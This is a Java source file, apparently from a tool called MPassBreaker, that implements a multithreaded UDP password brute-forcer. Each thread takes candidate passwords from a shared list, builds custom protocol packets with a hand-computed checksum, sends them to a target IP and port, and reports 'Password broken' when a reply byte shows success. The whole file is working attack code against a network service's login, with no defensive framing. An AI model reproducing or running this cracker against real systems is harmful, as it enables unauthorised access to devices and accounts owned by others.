package mpassbreaker;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.xml.bind.DatatypeConverter;
import static java.lang.System.exit;
import static mpassbreaker.MPassBreaker.combination;

public class BreakPass extends Thread {

    public static boolean responsed = true;
    public String begin1 = "deadbeefabababababababab";
    public String crc2 = "0000";
    public String size3 = "0014";
    public String part4 = "00ababab";
    public static String map5 = "";
    public String pass6 = "";
    public String pass7 = "";
    public String end8 = "badeabee";

    public void run() {
        sendPass();
    }

    public void sendPass() {
        try {
            boolean broken = false;
            String pass = "";
            byte buf[] = null;
            InetAddress servAddr = InetAddress.getByName(MPassBreaker.ip);
            DatagramSocket socket = new DatagramSocket();
            DatagramPacket packet1 = null;
            DatagramPacket packet2 = null;
            socket.setSoTimeout(3000);
            while (!broken && responsed) {
                synchronized (combination.lista) {
                    if (combination.lista.isEmpty()) {
                        int i;
                        for (i = 0; i < 10; i++) {
                            if (combination.lista.isEmpty()) {
                                Thread.sleep(1000);
                            } else {
                                break;
                            }
                        }
                        if (i >= 10) {
                            System.out.println("End of combination!");
                            exit(1);
                        }
                    }
                    pass = combination.lista.get(0);
                    combination.lista.remove(0);
                }
                buf = preparePacket(pass);
                boolean var = false;
                int i = 0;
                byte[] buff = new byte[4096];
                packet1 = new DatagramPacket(buf, buf.length, servAddr, MPassBreaker.port);
                packet2 = new DatagramPacket(buff, buff.length);
                while (i < 5 && !var) {
                    try {
                        socket.send(packet1);
                        socket.receive(packet2);
                    } catch (IOException ex) {
                        i++;
                        continue;
                    }
                    var = true;
                    if (packet2.getData()[28] != -1) {
                        System.out.println("Password broken: " + pass + "!!!");
                        System.exit(0);
                    }
                    synchronized (MPassBreaker.counter) {
                        MPassBreaker.counter++;
                    }
                }
                switch (i) {
                    case 3:
                        System.out.println(".");
                        break;
                    case 5:
                        System.out.println("Server not responsed 5 times!");
                        synchronized (combination.lista) {
                            combination.lista.add(pass);
                        }
                        responsed = false;
                        break;
                }

            }

            socket.close();
        } catch (IOException ex) {
            //ex.printStackTrace();
        } catch (InterruptedException ex) {
            Logger.getLogger(BreakPass.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public byte[] preparePacket(String pass) {
        pass6 = "";
        pass7 = "";
        char[] passch = pass.toCharArray();
        for (char c : passch) {
            pass6 += Integer.toHexString(c);
        }
        for (int i = 0; i < 32 - pass6.length(); i++) {
            pass7 += "0";
        }
        String part1 = begin1 + crc2 + size3 + part4 + map5 + pass6 + pass7 + end8;
        //System.out.println(pass+"   "+part1);
        byte[] pck = DatatypeConverter.parseHexBinary(part1);
        byte[] crc = checksum(pck);   //crc
        pck[12] = crc[0];
        pck[13] = crc[1];
        return pck;
    }

    static byte[] checksum(byte[] pck) {
        int crc = 0;
        for (int i = 20; i < pck.length - 4; i++) {
            //zaczynamy od 20 bo to jest tzn HEADSZ
            int x;
            if (pck[i] == -1) {
                x = 255;
            } else {
                x = pck[i];
            }

            if (x < 0) {
                x += 256;
            }
            crc += x;
            //w bugsie jak liczy crc to jak dochodzi do 65535 to od nowa liczy 
            if (crc > 65536) {
                crc = crc - 65536;
            }
        }
        //robimy tu cos w stylu htons
        int b1 = crc / 256;
        int b2 = crc % 256;
        byte[] ret = new byte[]{(byte) b1, (byte) b2};
        return ret;
    }

}
